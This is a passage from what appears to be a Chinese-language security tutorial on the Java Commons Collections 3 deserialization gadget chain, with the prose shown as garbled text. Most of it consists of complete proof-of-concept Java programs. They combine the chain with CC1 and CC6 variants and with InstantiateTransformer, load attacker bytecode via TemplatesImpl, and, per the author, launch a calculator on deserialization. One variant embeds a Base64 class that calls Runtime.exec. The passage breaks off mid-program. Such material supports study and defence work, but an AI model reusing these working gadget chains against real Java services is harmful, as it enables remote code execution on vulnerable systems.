public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯çœ‹å¦‚ä½•æ¥å…¥äº†CCé“¾äº†\nç»“åˆCC1 æµ‹è¯•ç¯å¢ƒï¼š commons-collections 3.2.1 JDK 8u65 CC3ï¼ˆTransformedMapé“¾ï¼‰ POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.util.Base64; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Base64.getDecoder().decode(\u0026#34;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQASTG9yZy9leGFtcGxlL1Rlc3Q7AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAlUZXN0LmphdmEMAAcACAcAJwwAKAApAQAEY2FsYwwAKgArAQAQb3JnL2V4YW1wbGUvVGVzdAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAAkAAABAAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAIACgAAAA4AAwAAAAoABAALAA0ADAALAAAADAABAAAADgAMAA0AAAAOAAAABAABAA8AAQAQABEAAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAAA8ACwAAACAAAwAAAAEADAANAAAAAAABABIAEwABAAAAAQAUABUAAgAOAAAABAABABYAAQAQABcAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACoABAAAAAEADAANAAAAAAABABIAEwABAAAAAQAYABkAAgAAAAEAGgAbAAMADgAAAAQAAQAWAAEAHAAAAAIAHQ==\u0026#34;); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼Œå…¶å®å°±æ˜¯å°†å‰é¢çš„é“¾å¼æ‰§è¡Œå‘½ä»¤æ”¹äº†ä¸€ä¸‹ã€‚\nè¿™é‡Œè¦è¯´æ˜ä¸€ä¸ªä¸œè¥¿ï¼Œå°±æ˜¯åˆ©ç”¨é“¾çš„InvokerTransformeråˆå§‹åŒ–é‚£é‡Œï¼Œå¯ä»¥å’Œå‰é¢çš„CC1å¯¹æ¯”ä¸€ä¸‹ï¼š\nå¦‚æœ paramTypes å’Œ args æ˜¯ nullï¼Œå®ƒä»¬è¡¨ç¤ºè¯¥æ–¹æ³•æ²¡æœ‰å‚æ•°ã€‚è€Œå¦‚æœå®ƒä»¬æ˜¯ new Class[]{null} å’Œ new Object[]{null}ï¼Œè¿™å®é™…ä¸Šæ˜¯è¡¨ç¤ºè¯¥æ–¹æ³•æœ‰ä¸€ä¸ªå‚æ•°ï¼Œä½†æ˜¯è¯¥å‚æ•°çš„ç±»å‹å’Œå€¼éƒ½æ˜¯ nullï¼Œè¿™ç§æƒ…å†µå¾ˆå¯èƒ½å¯¼è‡´æ–¹æ³•è°ƒç”¨å¤±è´¥ï¼Œå› ä¸ºå®é™…è°ƒç”¨çš„æ–¹æ³•æ²¡æœ‰å‚æ•°ï¼Œè€Œä»£ç å´è¯•å›¾ç”¨ä¸€ä¸ª null ç±»å‹å’Œ null å€¼è¿›è¡Œè°ƒç”¨ã€‚\næ‰€ä»¥ä¸Šé¢ä»£ç éœ€è¦ç›´æ¥ç”¨ä¸¤ä¸ªnullè¡¨ç¤ºæ— å‚æ•°çš„æ–¹æ³•\nCC3ï¼ˆLazyMapé“¾ï¼‰ POCï¼ˆå‰é¢ç”¨çš„base64ï¼Œè¿™é‡Œå°±ç”¨IOè¯»æ–‡ä»¶ï¼‰ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.lang.reflect.InvocationHandler; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nå±€é™ ä¹Ÿå°±æ˜¯CC1çš„å±€é™ï¼Œåœ¨JDK 8u71åå°±ä¸èƒ½å†ä½¿ç”¨äº†ã€‚\nç»“åˆCC6 æµ‹è¯•ç¯å¢ƒï¼š commons-collections 3.2.1 JDK 8u411 CC3ï¼ˆHashMapé“¾ï¼‰ POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºã€‚\nCC3ï¼ˆHashSeté“¾ï¼‰ å’ŒHashMapå·®ä¸å¤šï¼ŒPOCå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(ctf),new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,null,null)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashSet hash = new HashSet(); hash.add(outerMap); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } InstantiateTransformer æµ‹è¯•ç¯å¢ƒï¼š commons-collections 3.2.1 JDK 8u65 åˆ†æ ysoserialçš„CC3çš„POCæ²¡æœ‰ç”¨InvokerTransformeræ¥æ‰§è¡ŒnewTransformeræ–¹æ³•ï¼Œè€Œæ˜¯ç”¨çš„InstantiateTransformerç±»ï¼š InstantiateTransformerç±»ä½äºorg.apache.commons.collections.functors.InstantiateTransformerï¼Œ\næ¥çœ‹è¿™ä¸ªç±»ç”¨åˆ°çš„æºç \næ„é€ æ–¹æ³•ï¼š\ntransformæ–¹æ³•ï¼š\nå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„transformæ–¹æ³•å°±æ˜¯å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªç±»çš„ã€‚\nç»§ç»­çœ‹ysoserialçš„åˆ©ç”¨é“¾ï¼š\n1 2 3 4 5 Transformer[] transformers = new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { templatesImpl } )}; å®ƒå‰é¢ä¼ å…¥äº†ä¸€ä¸ªTrAXFilter.classï¼Œè¿™ä¸ªTrAXFilterç±»ä½ç½®æ˜¯com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilterã€‚\nåœ¨TrAXFilterç±»ä¸­ï¼Œæœ‰åœ°æ–¹è°ƒç”¨äº†newTransformer()æ–¹æ³•ï¼š è¿™ä¹Ÿå°±æ˜¯åœ¨ysoserialåˆ©ç”¨é“¾ä¸­ä¼ å…¥Templates.classçš„åŸå› ï¼ˆTemplatesæ¥å£ç±»ä½äºjavax.xml.transform.Templatesï¼‰ï¼Œç°åœ¨å¤§æ¦‚å°±æ¸…æ¥šäº†ï¼Œ\nåªè¦æˆ‘ä»¬å°†ä¸€ä¸ªè®¾ç½®å¥½äº†çš„TemplatesImplç±»èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼Œå†å°†é‚£ä¸ªå˜é‡ä¼ è¿›å»å½“åšTrAXFilterçš„å‚æ•°å˜é‡templatesçš„å€¼ï¼Œè¿™æ ·å°±ä¼šè‡ªç„¶è°ƒç”¨åˆ°TemplatesImplç±»çš„newTransformer()æ–¹æ³•ï¼Œè¿˜æ˜¯ç®€å•ç»™ä¸ªä»£ç ï¼Œå°±åƒå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\java_text\\\\java-1\\\\out\\\\production\\\\java-1\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; å°±æ˜¯å¦‚ä¸Šï¼Œè¿™æ ·InstantiateTransformerçš„transformer()æ–¹æ³•å°±å¯ä»¥åœ¨è·å–TrAXFilterç±»çš„æ„é€ æ–¹æ³•åå†è°ƒç”¨newInstance()æ–¹æ³•å°†è¿™ä¸ªTrAXFilterç±»å®ä¾‹åŒ–ï¼Œåœ¨å®ä¾‹åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œè‡ªç„¶å°±ä¼šè°ƒç”¨TemplatesImplçš„newTransformer()æ–¹æ³•ï¼š\né‚£ä¹ˆç°åœ¨å°±å¯ä»¥å°è¯•æ„é€ äº†ã€‚\nPOC ç»“åˆCC1 CC1çš„TransformedMapé“¾ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl templatesImpl = new TemplatesImpl(); setFieldValue(templatesImpl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(templatesImpl,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(templatesImpl, \u0026#34;_class\u0026#34;, null); setFieldValue(templatesImpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(hashMap,null,chain); Constructor constructor1 = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹è®¡ç®—æœºã€‚\nCC1çš„LazyMapé“¾ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import java.lang.reflect.Field; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import javax.xml.transform.Templates; import java.lang.Class; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.LazyMap; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(chainPart); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Constructor con = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;).getDeclaredConstructor(Class.class,Map.class); con.setAccessible(true); InvocationHandler proxy = (InvocationHandler) con.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy); Object o = con.newInstance(Retention.class,proxyMap); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹è®¡ç®—æœº\nç»“åˆCC6 HashMapé“¾çš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); Map hashMap = new HashMap(); Map lazy = LazyMap.decorate(hashMap,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); HashMap o = new HashMap(); o.put(outerMap,\u0026#34;xxxx\u0026#34;); hashMap.remove(\u0026#34;fupanc\u0026#34;); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } æˆåŠŸå¼¹è®¡ç®—æœº\nHashSeté“¾çš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Map; import java.util.HashMap; import java.util.HashSet; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.io.ObjectOutputStream; import java.io.ObjectInputStream; import java.io.FileOutputStream; import java.io.FileInputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = 